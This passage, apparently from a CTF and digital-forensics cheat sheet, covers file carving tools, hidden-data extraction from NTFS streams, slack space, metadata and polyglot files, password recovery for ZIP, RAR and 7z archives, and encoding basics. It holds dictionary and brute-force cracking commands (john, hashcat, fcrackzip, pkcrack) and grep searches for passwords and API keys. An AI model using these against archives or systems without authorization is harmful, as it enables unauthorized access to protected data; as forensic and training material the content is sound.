# Verbose output
foremost -v -i disk.img -o output_dir

# Custom configuration
foremost -c custom.conf -i disk.img -o output_dir
```

**Custom Configuration File** (`/etc/foremost.conf`)

```bash
# Format: extension  case  size  header  footer  [REVERSE] [NEXT]

# JPEG
jpg   y  20000000  \xff\xd8\xff\xe0\x00\x10  \xff\xd9

# PNG with size limit
png   y  10000000  \x89\x50\x4e\x47  \x49\x45\x4e\x44\xae\x42\x60\x82

# PDF
pdf   y  50000000  \x25\x50\x44\x46  \x0a\x25\x25\x45\x4f\x46\x0a

# ZIP archives
zip   y  100000000 \x50\x4b\x03\x04

# Custom file type
custom  y  5000000  \x43\x55\x53\x54\x4f\x4d  \x45\x4e\x44
```

**Carve from Specific Offset**

```bash
# Skip first 1MB
foremost -i disk.img -o output_dir -s 1048576

# Process only specific range
dd if=disk.img bs=1M skip=10 count=100 | foremost -i - -o output_dir
```

### Scalpel - Advanced File Carver

**Installation**

```bash
apt install scalpel
```

**Configuration** (`/etc/scalpel/scalpel.conf`)

```bash
# Uncomment file types to carve

# Images
jpg    y   20000000   \xff\xd8\xff\xe0\x00\x10   \xff\xd9
png    y   10000000   \x89PNG   \x49\x45\x4e\x44\xae\x42\x60\x82
gif    y   5000000    GIF8    \x00\x3b

# Documents
pdf    y   50000000   %PDF   %%EOF\x0d
doc    y   10000000   \xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1

# Archives
zip    y   100000000  PK\x03\x04
rar    y   100000000  Rar!

# Audio/Video
wav    y   50000000   RIFF????WAVE
avi    y   100000000  RIFF????AVI
mp3    y   10000000   \xff\xfb

# Enable quick mode for faster carving (less accurate)
# quick    y
```

**Usage**

```bash
# Carve with default config
scalpel disk.img -o output_dir

# Use custom config
scalpel -c custom.conf disk.img -o output_dir

# Quick mode (faster, less thorough)
scalpel -q disk.img -o output_dir

# Verbose output
scalpel -v disk.img -o output_dir

# Preview without extraction
scalpel -p disk.img -o output_dir
```

### Binwalk - Firmware and Embedded File Analysis

**Basic Scanning**

```bash
# Scan for embedded files
binwalk file.bin

# Extract all found files
binwalk -e file.bin

# Extract to specific directory
binwalk -e file.bin -C output_dir

# Recursive extraction (matryoshka)
binwalk -Me file.bin
```

**Advanced Options**

```bash
# Signature scan only (no extraction)
binwalk --signature file.bin

# Entropy analysis (detect encryption/compression)
binwalk -E file.bin

# Generate entropy graph
binwalk -E -J file.bin  # Output: file.bin.png

# Hex dump with annotations
binwalk -W file.bin

# Disassemble code regions
binwalk -A file.bin

# Raw compression scan
binwalk -R file.bin
```

**Custom Signature Scanning**

```bash
# Use custom magic file
binwalk --magic=/path/to/custom.magic file.bin

# Search for specific string
binwalk --raw="\x50\x4b\x03\x04" file.bin  # Search for ZIP headers

# Extract specific file type
binwalk --dd=".*" file.bin  # Extract everything
binwalk --dd="zip:zip" file.bin  # Extract only ZIPs
```

**Binwalk Python API**

```python
import binwalk

# Scan file
for module in binwalk.scan('file.bin', signature=True, quiet=True):
    print("%s Results:" % module.name)
    for result in module.results:
        print("\t%s    0x%.8X    %s" % (result.file.path, result.offset, result.description))

# Extract files
binwalk.scan('file.bin', signature=True, extract=True, directory='output')
```

### Photorec - Comprehensive File Recovery

**Interactive Mode**

```bash
# Launch interactive interface
photorec disk.img

# Navigate with arrow keys:
# 1. Select partition
# 2. Choose filesystem type (usually "Other")
# 3. Select search scope (Free or Whole)
# 4. Select output directory
```

**Command-Line Mode**

```bash
# Non-interactive carving
photorec /d output_dir /cmd disk.img partition_type,fileopt,everything,search

# Example: Carve NTFS partition
photorec /d recovered /cmd disk.img partition_07,fileopt,everything,search

# Limit file types (create photorec.cfg)
photorec /d output_dir /cmd disk.img options,keep_corrupted_file,mode_ext4,search

# Configuration file ~/.photorec.cfg
# Disable unwanted extensions:
# fileopt
```

**File Type Selection**

```bash
# Edit ~/.photorec.cfg or create local photorec.cfg
# Enable only specific extensions:

# Start with all disabled
fileopt,0

# Enable specific types
enable_jpg
enable_png
enable_pdf
enable_txt
enable_zip

# Save and use
photorec /d output_dir /cmd disk.img fileopt,mode_ext4,search
```

### Bulk Extractor - Parallel Feature Extraction

**Basic Usage**

```bash
# Extract all features
bulk_extractor -o output_dir disk.img

# Quiet mode
bulk_extractor -q -o output_dir disk.img

# Multiple threads
bulk_extractor -j 8 -o output_dir disk.img
```

**Specific Scanners**

```bash
# List available scanners
bulk_extractor -h | grep "Scanner"

# Enable specific scanners
bulk_extractor -E email -E url -o output_dir disk.img

# Disable scanners
bulk_extractor -x zip -x rar -o output_dir disk.img

# Common scanners:
# - email: Email addresses
# - url: URLs
# - ccn: Credit card numbers
# - telephone: Phone numbers
# - json: JSON data
# - gps: GPS coordinates
# - exif: EXIF data
```

**Output Analysis**

```bash
# Bulk extractor creates multiple output files:
ls output_dir/

# Key files:
# - email.txt: Extracted email addresses
# - url.txt: Found URLs
# - telephone.txt: Phone numbers
# - ccn.txt: Credit card numbers (histogram)
# - domain.txt: Domain names
# - zip.txt: ZIP file entries

# View feature files
cat output_dir/email.txt
cat output_dir/url.txt | sort -u
```

**Advanced Options**

```bash
# Set minimum string length
bulk_extractor -o output_dir -S strings_min=6 disk.img

# Process specific offset range
bulk_extractor -o output_dir -o 1048576 -B 10485760 disk.img

# Context-based extraction
bulk_extractor -C disk.img -o output_dir  # Show surrounding context

# Wordlist generation
bulk_extractor -W output_dir/wordlist.txt -o output_dir disk.img
```

### Manual Carving Techniques

**Using dd to Extract Files**

```bash
# Find file offset with binwalk or hexdump
binwalk file.bin | grep JPEG

# Extract from specific offset
dd if=file.bin of=extracted.jpg bs=1 skip=<offset>

# Extract specific number of bytes
dd if=file.bin of=extracted.jpg bs=1 skip=<offset> count=<size>

# Example: Extract JPEG at offset 0x1000, size 50KB
dd if=file.bin of=image.jpg bs=1 skip=4096 count=51200
```

**Hex Editor Manual Extraction**

```bash
# Open in hex editor
hexedit file.bin
xxd file.bin | less

# Find signature (e.g., JPEG: FF D8 FF)
xxd file.bin | grep "ffd8 ff"

# Calculate offset and extract
# Use xxd output: first column is offset in hex
```

**Python Script for Custom Carving**

```python
#!/usr/bin/env python3
import re

def carve_files(input_file, output_dir):
    signatures = {
        'jpg': (b'\xff\xd8\xff', b'\xff\xd9'),
        'png': (b'\x89PNG\r\n\x1a\n', b'IEND\xae\x42\x60\x82'),
        'pdf': (b'%PDF', b'%%EOF'),
        'zip': (b'PK\x03\x04', None),  # No consistent footer
    }
    
    with open(input_file, 'rb') as f:
        data = f.read()
    
    for file_type, (header, footer) in signatures.items():
        offset = 0
        file_count = 0
        
        while True:
            start = data.find(header, offset)
            if start == -1:
                break
            
            if footer:
                end = data.find(footer, start)
                if end == -1:
                    offset = start + len(header)
                    continue
                end += len(footer)
            else:
                # For files without footer, extract fixed size or until next header
                end = data.find(header, start + len(header))
                if end == -1:
                    end = len(data)
            
            # Extract file
            file_data = data[start:end]
            output_path = f"{output_dir}/{file_type}_{file_count:04d}.{file_type}"
            
            with open(output_path, 'wb') as out:
                out.write(file_data)
            
            print(f"[+] Carved: {output_path} (offset: {hex(start)}, size: {end-start} bytes)")
            
            file_count += 1
            offset = end

# Usage
carve_files('disk.img', 'carved_files')
```

**Stream-based Carving for Large Files**

```python
#!/usr/bin/env python3

def stream_carve(input_file, output_dir, chunk_size=1024*1024):
    """Carve files from large disk images without loading entire file"""
    
    signatures = {
        'jpg': (b'\xff\xd8\xff\xe0', b'\xff\xd9'),
        'png': (b'\x89\x50\x4e\x47', b'\x49\x45\x4e\x44\xae\x42\x60\x82'),
    }
    
    for file_type, (header, footer) in signatures.items():
        file_count = 0
        buffer = b''
        in_file = False
        current_file = None
        
        with open(input_file, 'rb') as f:
            offset = 0
            
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                
                buffer += chunk
                
                # Search for headers
                while True:
                    if not in_file:
                        header_pos = buffer.find(header)
                        if header_pos == -1:
                            # Keep last part of buffer for overlapping signatures
                            buffer = buffer[-len(header):]
                            break
                        
                        # Start new file
                        output_path = f"{output_dir}/{file_type}_{file_count:04d}.{file_type}"
                        current_file = open(output_path, 'wb')
                        current_file.write(buffer[header_pos:header_pos+len(header)])
                        buffer = buffer[header_pos+len(header):]
                        in_file = True
                        print(f"[+] Found {file_type} at offset {hex(offset + header_pos)}")
                    
                    else:
                        # Look for footer
                        footer_pos = buffer.find(footer)
                        if footer_pos == -1:
                            # Write buffer to file and continue
                            current_file.write(buffer)
                            buffer = b''
                            break
                        
                        # Found footer - complete file
                        current_file.write(buffer[:footer_pos+len(footer)])
                        current_file.close()
                        file_count += 1
                        
                        buffer = buffer[footer_pos+len(footer):]
                        in_file = False
                
                offset += len(chunk)

# Usage
stream_carve('large_disk.img', 'output', chunk_size=10*1024*1024)
```

### Specialized Carving Tools

**TestDisk** - Partition and file recovery

```bash
# Interactive mode
testdisk disk.img

# Menu navigation:
# 1. Select disk
# 2. Choose partition table type (Intel, GPT, etc.)
# 3. Analyze â†’ Quick Search
# 4. Select partition
# 5. Advanced â†’ List files
# 6. Select files to recover
```

**Autopsy** - GUI forensic platform

```bash
# Install
apt install autopsy

# Launch web interface
autopsy

# Access: http://localhost:9999/autopsy

# Create case â†’ Add disk image â†’ Run file carving
```

**Volatility (Memory Carving)**

```bash
# Install
pip3 install volatility3

# List processes
vol3 -f memory.dump windows.pslist

# Dump process memory
vol3 -f memory.dump windows.memmap --pid 1234 --dump

# Carve files from memory
vol3 -f memory.dump windows.filescan
vol3 -f memory.dump windows.dumpfiles --physaddr <address>

# Extract cached files
vol3 -f memory.dump windows.mftscan
```

**Hachoir** - Python metadata extraction and carving

```bash
# Install
pip3 install hachoir

# Extract metadata
hachoir-metadata file.bin

# Parse file structure
hachoir-urwid file.bin  # Interactive TUI

# Python usage
python3 << 'EOF'
from hachoir.parser import createParser
from hachoir.metadata import extractMetadata

parser = createParser('file.bin')
metadata = extractMetadata(parser)
if metadata:
    for line in metadata.exportPlaintext():
        print(line)
EOF
```

### Dealing with Corrupted/Fragmented Files

**File Repair Tools**

```bash
# JPEG repair
jpeginfo --check --delete broken.jpg
jhead -purejpg fixed.jpg

# PNG repair
pngcheck -v broken.png
pngcrush -fix broken.png fixed.png

# PDF repair
pdftk broken.pdf output fixed.pdf
gs -o fixed.pdf -sDEVICE=pdfwrite broken.pdf

# ZIP repair
zip -FF broken.zip --out fixed.zip
```

**Fragment Reassembly**

```bash
# Identify fragments
binwalk fragment1.bin
binwalk fragment2.bin

# Check file sizes and signatures
file fragment*.bin

# Concatenate fragments
cat fragment1.bin fragment2.bin > complete.bin

# Verify result
file complete.bin
binwalk complete.bin
```

**Entropy Analysis to Identify Data Types**

```bash
# Generate entropy graph
binwalk -E file.bin

# High entropy (0.9-1.0): Encrypted or compressed
# Medium entropy (0.5-0.8): Mixed binary/text
# Low entropy (0.0-0.5): Text or structured data

# Python entropy calculation
python3 << 'EOF'
import math
from collections import Counter

def calculate_entropy(data):
    if not data:
        return 0
    
    entropy = 0
    counter = Counter(data)
    
    for count in counter.values():
        p = count / len(data)
        entropy -= p * math.log2(p)
    
    return entropy / 8  # Normalize to 0-1

with open('file.bin', 'rb') as f:
    data = f.read()
    print(f"Entropy: {calculate_entropy(data):.4f}")
EOF
```

---

## Hidden Data Extraction

Hidden data extraction focuses on recovering concealed information from various file formats, filesystem artifacts, alternate data streams, slack space, and unconventional storage locations.

### NTFS Alternate Data Streams (ADS)

**Windows ADS Manipulation**

```cmd
# Create ADS
echo "hidden content" > file.txt:hidden.txt

# View file (appears normal)
type file.txt

# Read ADS
type file.txt:hidden.txt
more < file.txt:hidden.txt

# List all streams
dir /R

# PowerShell method
Get-Item file.txt -Stream *
Get-Content file.txt -Stream hidden.txt
```

**Linux ADS Analysis**

```bash
# Mount NTFS with stream support
mount -t ntfs-3g /dev/sdb1 /mnt/ntfs

# List ADS using attr
apt install attr
getfattr -d -m - /mnt/ntfs/file.txt

# List with streams
ls -l /mnt/ntfs/file.txt
find /mnt/ntfs -type f -exec getfattr -d -m - {} \; 2>/dev/null

# Extract ADS
attr -g ads_name /mnt/ntfs/file.txt

# Automated ADS extraction with Python
python3 << 'EOF'
import os
import subprocess

def find_ads(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            result = subprocess.run(['getfattr', '-d', '-m', '-', filepath], 
                                    capture_output=True, text=True)
            if 'user.streams' in result.stdout:
                print(f"[+] ADS found: {filepath}")
                print(result.stdout)

find_ads('/mnt/ntfs')
EOF
```

**Streams.exe (Sysinternals)**

```cmd
# Download from Microsoft Sysinternals

# List streams
streams.exe file.txt

# Recursively scan directory
streams.exe -s C:\Data

# Delete all ADS
streams.exe -d file.txt
```

### Slack Space Analysis

**File Slack** - Space between end of file and end of cluster

```bash
# Calculate slack space
# Cluster size (typically 4KB on modern systems)
CLUSTER_SIZE=4096

# Get file size
FILE_SIZE=$(stat -c%s file.txt)

# Calculate slack
SLACK=$((CLUSTER_SIZE - (FILE_SIZE % CLUSTER_SIZE)))

echo "Slack space: $SLACK bytes"

# Extract slack space with dd
dd if=/dev/sdb1 bs=1 skip=$FILE_SIZE count=$SLACK of=slack.bin
```

**SleuthKit Slack Analysis**

```bash
# Install
apt install sleuthkit

# View file system info
fsstat disk.img

# List all files with slack info
fls -r disk.img

# Extract file with slack
icat -s disk.img <inode> > file_with_slack.bin

# Analyze specific inode
istat disk.img <inode>
```

**bmap - Slack Space Tool**

```bash
# Install
apt install bmap

# Carve slack space from mounted filesystem
bmap --mode slack /dev/sdb1 > slack_data.bin

# Search slack space for keywords
strings slack_data.bin | grep -i "password\|secret"
```

### Filesystem Metadata Extraction

**Extended Attributes (Linux)**

```bash
# View extended attributes
getfattr -d -m - file.txt

# Set extended attribute (for testing)
setfattr -n user.comment -v "hidden message" file.txt

# Get specific attribute
getfattr -n user.comment file.txt

# List all files with extended attributes
find / -type f -exec getfattr -d {} \; 2>/dev/null | grep -B1 "user\."
```

**EXIF/Metadata Deep Dive**

```bash
# Extract all metadata
exiftool -a -G1 -s file.jpg

# Extract binary metadata fields
exiftool -b -ThumbnailImage file.jpg > thumbnail.jpg
exiftool -b -PreviewImage file.jpg > preview.jpg

# Search for specific tags
exiftool -UserComment -Comment -ImageDescription file.jpg

# Hex dump of metadata section
exiftool -htmldump file.jpg > metadata.html

# Extract GPS coordinates
exiftool -gpslatitude -gpslongitude -n file.jpg

# Timeline analysis
exiftool -Time:All -s file.jpg
```

**PDF Metadata and Hidden Content**

```bash
# Extract metadata
pdfinfo document.pdf
exiftool document.pdf

# Extract text (including hidden layers)
pdftotext document.pdf output.txt

# Extract images
pdfimages document.pdf output_prefix

# Analyze PDF structure
pdftk document.pdf dump_data output metadata.txt

# Extract embedded files
pdfdetach -list document.pdf
pdfdetach -saveall -o output_dir document.pdf

# Check for JavaScript
pdf-parser --search javascript document.pdf

# Extract all streams
pdf-parser --raw document.pdf > streams.txt
```

**Office Document Hidden Data**

```bash
# Office files are ZIP archives
unzip -l document.docx

# Extract all contents
unzip document.docx -d extracted/

# Check for hidden relationships
cat extracted/word/_rels/document.xml.rels

# Extract embedded objects
cd extracted/word/embeddings/
file *

# Search for macros (VBA)
olevba document.docm

# Extract macro code
olevba -c document.docm > macros.vba

# Check for hidden sheets (Excel)
python3 << 'EOF'
from openpyxl import load_workbook

wb = load_workbook('spreadsheet.xlsx')
for sheet in wb.sheetnames:
    ws = wb[sheet]
    if ws.sheet_state == 'hidden':
        print(f"Hidden sheet: {sheet}")
        ws.sheet_state = 'visible'
wb.save('unhidden.xlsx')
EOF
```

### ZIP Archive Hidden Data

**Comments and Extra Fields**

```bash
# View ZIP comments
unzip -z archive.zip

# Extract with comments
zipinfo -v archive.zip

# Check for password-protected files
7z l -slt archive.zip | grep -i "encrypted"

# Extract extra field data
python3 << 'EOF'
import zipfile

with zipfile.ZipFile('archive.zip', 'r') as zf:
    for info in zf.filelist:
        print(f"File: {info.filename}")
        print(f"Comment: {info.comment}")
        print(f"Extra: {info.extra.hex()}")
        print("---")
EOF
```

**Hidden Files in Archives**

```bash
# List all files (including hidden)
unzip -l archive.zip

# Some tools hide files by manipulating central directory
# Manual inspection with hex editor:
xxd archive.zip | grep "504b 0102"  # Central directory signature

# Extract with alternate tools
7z x archive.zip
bsdtar -xf archive.zip

# Check for appended data after ZIP
zipdetails archive.zip
binwalk archive.zip
```

**ZIP Password Recovery**

```bash
# Dictionary attack
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt archive.zip

# Brute force (numeric)
fcrackzip -b -c '1' -l 1-4 -u archive.zip

# John the Ripper
zip2john archive.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Hashcat
hashcat -m 13600 -a 0 hash.txt wordlist.txt
```

### Polyglot Files

Polyglot files are valid as multiple file types simultaneously, often used to hide data.

**Detection**

```bash
# Check multiple interpretations
file polyglot.png
file polyglot.png | head -c 4 | xxd  # Check magic bytes

# Try opening as different formats
eog polyglot.png        # As image
unzip polyglot.png      # As ZIP
pdftotext polyglot.png  # As PDF

# Manual inspection
hexdump -C polyglot.png | head -50
binwalk polyglot.png
```

**Common Polyglot Combinations**

```bash
# PNG + ZIP
# PNG header: 89 50 4E 47
# ZIP can be appended after IEND chunk

# Extract ZIP from PNG
dd if=polyglot.png bs=1 skip=$(grep -abo "PK" polyglot.png | head -1 | cut -d: -f1) of=extracted.zip

# JPEG + RAR
# JPEG ignores data after FF D9 (EOI marker)
# RAR archive can follow

# Extract RAR from JPEG
dd if=polyglot.jpg bs=1 skip=$(grep -abo "Rar!" polyglot.jpg | cut -d: -f1) of=extracted.rar

# GIF + JavaScript
# Valid GIF that executes as JS in browser context
```

**Creating Detection Scripts**

```python
#!/usr/bin/env python3
import struct

def detect_polyglot(filename):
    """Detect potential polyglot files"""
    
    signatures = {
        'PNG': b'\x89\x50\x4e\x47',
        'JPEG': b'\xff\xd8\xff',
        'GIF': b'\x47\x49\x46\x38',
        'PDF': b'\x25\x50\x44\x46',
        'ZIP': b'\x50\x4b\x03\x04',
        'RAR': b'\x52\x61\x72\x21',
    }
    
    with open(filename, 'rb') as f:
        data = f.read()
    
    found = []
    for name, sig in signatures.items():
        positions = []
        offset = 0
        while True:
            pos = data.find(sig, offset)
            if pos == -1:
                break
            positions.append(pos)
            offset = pos + 1
        
        if positions:
            found.append((name, positions))
    
    if len(found) > 1:
        print(f"[!] Potential polyglot detected: {filename}")
        for name, positions in found:
            print(f"  {name} signatures at: {[hex(p) for p in positions]}")
    
    return found

# Usage
detect_polyglot('suspicious.png')
```

### Whitespace and Invisible Characters

**Whitespace Steganography**

```bash
# Detect unusual whitespace patterns
cat -A file.txt  # Show all characters

# Extract binary from spaces/tabs
python3 << 'EOF'
def extract_whitespace(filename):
    with open(filename, 'r') as f:
        text = f.read()
    
    binary = ''
    for char in text:
        if char == ' ':
            binary += '0'
        elif char == '\t':
            binary += '1'
    
    # Convert binary to text
    result = ''
    for i in range(0, len(binary), 8):
        byte = binary[i:i+8]
        if len(byte) == 8:
            result += chr(int(byte, 2))
    
    return result

print(extract_whitespace('file.txt'))
EOF
```

**Zero-Width Characters (Unicode)**

```bash
# Detect zero-width characters
python3 << 'EOF'
def detect_zero_width(text):
    zero_width = [
        '\u200B',  # Zero width space
        '\u200C',  # Zero width non-joiner
        '\u200D',  # Zero width joiner
        '\uFEFF',  # Zero width no-break space
    ]
    
    for i, char in enumerate(text):
        if char in zero_width:
            print(f"Position {i}: {repr(char)}")

with open('file.txt', 'r', encoding='utf-8') as f:
    detect_zero_width(f.read())
EOF
```

### Database and Container Analysis

**SQLite Hidden Data**

```bash
# Open database
sqlite3 database.db

# List tables (including hidden)
.tables

# Show schema
.schema

# Check for deleted records with forensic tools
apt install sqlite3-tools
echo "PRAGMA integrity_check;" | sqlite3 database.db

# Extract free space (may contain deleted data)
strings database.db | grep -i "flag\|password"
```

**Docker Image Layer Analysis**

```bash
# Save image
docker save image:tag -o image.tar

# Extract layers
mkdir layers && cd layers
tar -xf ../image.tar

# Examine each layer
for layer in */layer.tar; do
    echo "[+] Analyzing $layer"
    tar -tf "$layer"
done

# Extract all layers
for layer in */layer.tar; do
    tar -xf "$layer"
done

# Search for secrets
grep -r "password\|api_key\|secret" .
```

### Automated Hidden Data Discovery

**Comprehensive Analysis Script**

```bash
#!/bin/bash

TARGET="$1"
OUTPUT="analysis_$(basename $TARGET)"

mkdir -p "$OUTPUT"

echo "[*] Analyzing: $TARGET"

# Basic info
echo "[+] File information" | tee "$OUTPUT/info.txt"
file "$TARGET" | tee -a "$OUTPUT/info.txt"
stat "$TARGET" | tee -a "$OUTPUT/info.txt"

# Metadata
echo "[+] Metadata extraction" | tee "$OUTPUT/metadata.txt"
exiftool -a "$TARGET" | tee -a "$OUTPUT/metadata.txt"

# Strings
echo "[+] String extraction" | tee "$OUTPUT/strings.txt"
strings "$TARGET" | tee -a "$OUTPUT/strings.txt"

# Binwalk
echo "[+] Embedded file detection" | tee "$OUTPUT/binwalk.txt"
binwalk "$TARGET" | tee -a "$OUTPUT/binwalk.txt"
binwalk -e "$TARGET" -C "$OUTPUT/extracted"

# Entropy
echo "[+] Entropy analysis"
binwalk -E "$TARGET"

# Hex inspection
echo "[+] Hex dump (first 1KB)" | tee "$OUTPUT/hexdump.txt"
xxd "$TARGET" | head -64 | tee -a "$OUTPUT/hexdump.txt"

# File carving
echo "[+] File carving"
foremost -i "$TARGET" -o "$OUTPUT/foremost"
scalpel "$TARGET" -o "$OUTPUT/scalpel"

# Format-specific analysis
case "$TARGET" in
    *.zip|*.jar|*.apk)
        echo "[+] ZIP analysis"
        unzip -l "$TARGET" > "$OUTPUT/zip_contents.txt"
        zipinfo -v "$TARGET" > "$OUTPUT/zip_info.txt"
        ;;
    *.png|*.jpg|*.gif)
        echo "[+] Image steganography"
        zsteg -a "$TARGET" > "$OUTPUT/zsteg.txt" 2>&1
        steghide info "$TARGET" 2>&1 | tee "$OUTPUT/steghide.txt"
        ;;
    *.wav|*.mp3)
        echo "[+] Audio analysis"
        sox "$TARGET" -n spectrogram -o "$OUTPUT/spectrogram.png" 2>/dev/null
        ;;
esac

echo "[*] Analysis complete. Results in: $OUTPUT"
```

**Key Reminders:**

- [Inference] Many file carving tools have overlapping capabilities; using multiple tools increases recovery success rates
- [Unverified] Effectiveness of steganography detection tools varies significantly based on the specific algorithm used for embedding
- Always verify extracted data integrity by checking file signatures and attempting to open recovered files

**Related Topics**: Forensic disk imaging, memory forensics, network packet carving, encrypted container analysis, anti-forensics detection

---

## Encrypted Archive Analysis

Encrypted archives protect sensitive data and are common in CTF scenarios requiring password recovery, encryption breaking, or structural analysis.

### Archive Type Identification

```bash
# Identify file type
file archive.zip
file archive.rar
file unknown_file

# Detailed file analysis
binwalk archive.zip
exiftool archive.zip

# Hex dump inspection
xxd archive.zip | head
hexdump -C archive.zip | head
```

### ZIP Archives

**Standard Extraction**:

```bash
# Extract ZIP
unzip archive.zip

# List contents without extracting
unzip -l archive.zip

# Extract to specific directory
unzip archive.zip -d /tmp/extracted

# Extract specific file
unzip archive.zip filename.txt
```

**Password-Protected ZIP Analysis**:

```bash
# Attempt extraction (prompts for password)
unzip archive.zip

# Check encryption type
7z l -slt archive.zip | grep Method

# Extract ZIP hash for cracking
zip2john archive.zip > zip_hash.txt

# Crack with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt

# Crack with hashcat
hashcat -m 13600 -a 0 zip_hash.txt /usr/share/wordlists/rockyou.txt

# Brute force with fcrackzip
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt archive.zip
fcrackzip -b -c 'aA1!' -l 1-8 archive.zip  # Brute force length 1-8
```

**ZIP Structure Analysis**:

```bash
# Examine ZIP structure
zipinfo archive.zip
zipinfo -v archive.zip  # Verbose output

# Check for ZIP corruption
zip -T archive.zip
zip -FF archive.zip --out fixed.zip  # Attempt repair

# Extract data without password (known plaintext attack)
pkcrack -C encrypted.zip -c filename.txt -P plaintext.zip -p filename.txt -d decrypted.zip
```

### RAR Archives

**RAR Extraction**:

```bash
# Extract RAR
unrar x archive.rar

# List contents
unrar l archive.rar

# Test integrity
unrar t archive.rar

# Extract with full path
unrar x archive.rar /tmp/extracted/
```

**Password-Protected RAR**:

```bash
# Extract RAR hash
rar2john archive.rar > rar_hash.txt

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt

# Crack with hashcat (RAR3)
hashcat -m 12500 -a 0 rar_hash.txt /usr/share/wordlists/rockyou.txt

# Crack with hashcat (RAR5)
hashcat -m 13000 -a 0 rar_hash.txt /usr/share/wordlists/rockyou.txt
```

### 7-Zip Archives

**7z Operations**:

```bash
# Extract 7z
7z x archive.7z

# List contents
7z l archive.7z

# Extract specific file
7z e archive.7z filename.txt

# Test archive
7z t archive.7z
```

**Password Recovery**:

```bash
# Extract hash
7z2john archive.7z > 7z_hash.txt

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt 7z_hash.txt

# Crack with hashcat
hashcat -m 11600 -a 0 7z_hash.txt /usr/share/wordlists/rockyou.txt
```

### TAR Archives (Often Combined with Compression)

```bash
# Extract tar.gz
tar -xzf archive.tar.gz

# Extract tar.bz2
tar -xjf archive.tar.bz2

# Extract tar.xz
tar -xJf archive.tar.xz

# List contents
tar -tzf archive.tar.gz

# Extract to specific directory
tar -xzf archive.tar.gz -C /tmp/extracted/

# Create encrypted tar with GPG
tar -czf - files/ | gpg -c > archive.tar.gz.gpg

# Decrypt and extract
gpg -d archive.tar.gz.gpg | tar -xzf -
```

### Advanced Archive Techniques

**Binwalk - Embedded File Extraction**:

```bash
# Scan for embedded files
binwalk archive.zip

# Extract all embedded files
binwalk -e archive.zip

# Extract with signature matching
binwalk --dd='.*' archive.zip

# Entropy analysis (detect encryption/compression)
binwalk -E archive.zip
```

**Foremost - File Carving**:

```bash
# Carve files from archive
foremost -i archive.zip -o carved_output/

# Specify file types
foremost -t jpg,png,pdf -i archive.zip -o output/
```

**Strings Analysis**:

```bash
# Extract readable strings
strings archive.zip

# Extract strings with minimum length
strings -n 8 archive.zip

# Search for specific patterns
strings archive.zip | grep -i password
strings archive.zip | grep -E '[A-Za-z0-9+/]{20,}={0,2}'  # Base64 patterns
```

## Data Encoding/Decoding (Base64, Hex, Binary)

Data encoding transforms information into alternative representations for transmission, storage, or obfuscation. CTF challenges often layer multiple encoding schemes.

### Base64 Encoding/Decoding

**Command-Line Tools**:

```bash
# Encode text
echo "secret_data" | base64
echo -n "secret_data" | base64  # Without trailing newline

# Decode base64
echo "c2VjcmV0X2RhdGE=" | base64 -d

# Encode file
base64 image.png > encoded.txt

# Decode to file
base64 -d encoded.txt > decoded.png

# Multi-line base64 decoding
cat encoded.txt | base64 -d > output.bin
```

**Python Base64**:

```python
import base64

# Encode string
data = b"secret_data"
encoded = base64.b64encode(data)
print(encoded.decode())

# Decode string
decoded = base64.b64decode(encoded)
print(decoded.decode())

# URL-safe base64
url_encoded = base64.urlsafe_b64encode(data)
url_decoded = base64.urlsafe_b64decode(url_encoded)

# Base32 encoding
base32_encoded = base64.b32encode(data)
base32_decoded = base64.b32decode(base32_encoded)

# Base16 (hexadecimal)
base16_encoded = base64.b16encode(data)
base16_decoded = base64.b16decode(base16_encoded)
```

**Base64 Variants**:

```bash
# Standard base64 alphabet: A-Z, a-z, 0-9, +, /
# URL-safe: A-Z, a-z, 0-9, -, _
# Base32: A-Z, 2-7
# Base16: 0-9, A-F
```

**CyberChef - Multi-Encoding Tool**: [Unverified: CyberChef is a web-based tool; exact capabilities depend on version]

```
URL: https://gchq.github.io/CyberChef/
Operations: From Base64, To Base64, Magic (auto-detect encoding)
```

### Hexadecimal Encoding/Decoding

**Command-Line Hex Operations**:

```bash
# Convert text to hex
echo -n "secret" | xxd -p
echo -n "secret" | hexdump -e '16/1 "%02x"'

# Convert hex to text
echo "736563726574" | xxd -r -p

# Hex dump with offsets
xxd file.bin

# Create binary from hex
echo "736563726574" | xxd -r -p > output.bin

# hex to ASCII
printf "\x73\x65\x63\x72\x65\x74"
```

**Python Hex Conversions**:

```python
# String to hex
data = "secret"
hex_data = data.encode().hex()
print(hex_data)  # 736563726574

# Hex to string
hex_string = "736563726574"
decoded = bytes.fromhex(hex_string).decode()
print(decoded)  # secret

# Integer to hex
num = 255
hex_num = hex(num)  # 0xff

# Hex to integer
int("ff", 16)  # 255
```

### Binary Encoding/Decoding

**Binary String Operations**:

```bash
# Text to binary
echo -n "A" | xxd -b

# Binary to text (using Python)
python3 -c "print(chr(int('01000001', 2)))"
```

**Python Binary Conversions**:

```python
# String to binary
text = "secret"
binary = ' '.join(format(ord(c), '08b') for c in text)
print(binary)
# 01110011 01100101 01100011 01110010 01100101 01110100

# Binary to string
binary_string = "01110011 01100101 01100011 01110010 01100101 01110100"
decoded = ''.join(chr(int(b, 2)) for b in binary_string.split())
print(decoded)  # secret

# Integer to binary
num = 65
bin(num)  # '0b1000001'

# Binary to integer
int('1000001', 2)  # 65
```

### URL Encoding/Decoding

**Python URL Operations**:

```python
import urllib.parse

# URL encode
data = "secret data with spaces"
encoded = urllib.parse.quote(data)
print(encoded)  # secret%20data%20with%20spaces

# URL decode
decoded = urllib.parse.unquote(encoded)
print(decoded)

# Full URL parsing
url = "http://example.com/path?param=value&data=encoded%20data"
parsed = urllib.parse.urlparse(url)
params = urllib.parse.parse_qs(parsed.query)
```

**Command-Line URL Encoding**:

```bash
# Using Python
python3 -c "import urllib.parse; print(urllib.parse.quote('secret data'))"

# Using jq (for JSON)
echo '{"data":"secret value"}' | jq -r '.data | @uri'
```

### ROT13 and Caesar Cipher

**ROT13**:

```bash
# Encode/Decode ROT13 (symmetric)
